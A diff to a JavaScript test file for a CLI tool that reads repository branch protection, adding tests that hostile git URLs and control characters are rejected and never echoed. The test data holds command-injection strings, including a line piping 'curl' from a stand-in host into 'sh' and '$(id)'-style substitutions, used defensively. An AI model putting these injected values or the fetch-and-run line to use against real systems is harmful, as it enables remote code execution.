@@ -20451,7 +20451,11 @@ test('E70: no address anywhere in a line, a hint or --json; one login check per 
   assert.ok(!/b\.com/.test(JSON.stringify(protectionJSON(r))), 'the --json object too');
   r = readProtection({ platform: 'gitlab', gitUrl: 'a@b.com@gitlab.com:g/p.git', branch: 'main' }, { runner: fakePlatform({ authed: false }).runner, env: ON });
   l = protectionLine(r, { name: 'svc' });
-  assert.equal(l.hint, 'run `glab auth login --hostname a name with an @ in it`, then `yad doctor` again', 'the login hint names the host');
+  // Since E81 review 13 a host that is not a plain host name is never asked about or repeated: no login
+  // command is built from it.
+  assert.equal(r.kind, 'no-url');
+  assert.match(l.hint, /^fix `git_url`/);
+  assert.ok(!/b\.com/.test(`${l.message} ${l.hint}`));
   r = readProtection({ platform: 'bob@x.com', gitUrl: GH_URL, branch: 'main' }, { runner: f.runner, env: ON });
   assert.ok(!/x\.com/.test(protectionLine(r, { name: 'svc' }).message));
   ({ r } = glRead([[/\/approval_rules/, 200, [{ name: 'owner bob@x.com', approvals_required: 1, protected_branches: [] }]], [/\/protected_branches/, 200, []]]));
@@ -26739,5 +26743,51 @@ test('E81 review 12: the protection line, the CI tags check and refresh print re
     const ref = e79Yad(T, product, ['repo', 'refresh'], { PATH: '/usr/bin:/bin' });
     assert.match(ref.stdout + ref.stderr, /b \[2Jx: npx missing/);
     assert.ok(!hasRaw(ref.stdout + ref.stderr));
+  } finally { fs.rmSync(T, { recursive: true, force: true }); }
+});
+
+test('E81 review 13: a registry host that is not a plain host name is never used or repeated; the last raw prints are cleaned', async () => {
+  const { readProtection, protectionLine } = await import('./protection.mjs');
+  const { pathToFileURL } = await import('node:url');
+  const hasRaw = (t) => ['\u001b', '\u009b', '\u202e'].some((ch) => t.includes(ch));
+  const calls = [];
+  const runner = (cmd, args) => { calls.push([cmd, ...args]); return { ok: cmd === 'which' || cmd === 'where', stdout: '' }; };
+  for (const gitUrl of ['$(curl -s evil.example | sh):o/r', 'https://$(id)/o/r', 'git@a;touch${IFS}x:o/r', '\u001b[2Jhost:o/r']) {
+    calls.length = 0;
+    const r = readProtection({ platform: 'github', gitUrl, branch: 'main' }, { runner, env: {} });
+    assert.equal(r.kind, 'no-url', gitUrl);
+    const line = protectionLine(r, { name: 'api' });
+    const text = `${line.message}\n${line.hint || ''}`;
+    assert.doesNotMatch(text, /curl|\$\(|touch/, gitUrl);
+    assert.ok(!hasRaw(text), gitUrl);
+    assert.deepEqual(calls, [], `${gitUrl}: no CLI asked`);
+  }
+  assert.equal(readProtection({ platform: 'github', gitUrl: 'https://github.com/o/r', branch: 'main' }, { runner, env: {} }).kind, 'no-login', 'a plain host is still asked about');
+  const odd = readProtection({ platform: '\u009b31m\u202e', gitUrl: 'https://github.com/o/r' }, { runner, env: {} });
+  assert.ok(!hasRaw(protectionLine(odd, { name: 'api' }).message), 'an unknown platform is cleaned');
+
+  const T = e79Tmp();
+  try {
+    const { product, backend } = e80Workspace(T);
+    // A folder in the registered repo's own tree, named with an escape, that the risk map does not cover.
+    fs.mkdirSync(path.join(backend, '.sdlc'), { recursive: true });
+    fs.writeFileSync(path.join(backend, '.sdlc', 'risk-map'), '# yad-risk-map v1\n');
+    fs.mkdirSync(path.join(backend, 'ev\u001b[31mil'));
+    fs.writeFileSync(path.join(backend, 'ev\u001b[31mil', 'f.js'), 'x');
+    e79Git(T, backend, 'add', '-A');
+    e79Git(T, backend, 'commit', '-qm', 'tree');
+    fs.writeFileSync(path.join(product, '.sdlc', 'repos.json'), JSON.stringify({ repos: [{ name: 'backend', path: '../backend', platform: '\u009b31m\u202e' }] }));
+    // The Product's own default branch, with an escape, read on another branch.
+    fs.writeFileSync(path.join(product, '.sdlc', 'hub.json'), JSON.stringify({ platform: 'github', default_branch: '\u001b[31mRED' }));
+    e79Git(T, product, 'init', '-q', '-b', 'feat');
+    e79Git(T, product, 'add', '-A');
+    e79Git(T, product, 'commit', '-qm', 'p');
+    const doc = e79Yad(T, product, ['doctor']);
+    assert.ok(!hasRaw(doc.stdout + doc.stderr), 'doctor prints no raw control character');
+    // guardDefaultBranch (reached by `yad repo refresh --push`) prints the hub's branch cleaned.
+    const g = spawnSync(process.execPath, ['--input-type=module', '-e',
+      `const { guardDefaultBranch } = await import(${JSON.stringify(pathToFileURL(path.join(ROOT, 'cli', 'hubcommit.mjs')).href)}); guardDefaultBranch('feat', '\\u001b[31mRED');`], { encoding: 'utf8', env: e79Env(T) });
+    assert.match(g.stdout + g.stderr, /not the default branch ' \[31mRED'/);
+    assert.ok(!hasRaw(g.stdout + g.stderr));
   } finally { fs.rmSync(T, { recursive: true, force: true }); }
 });
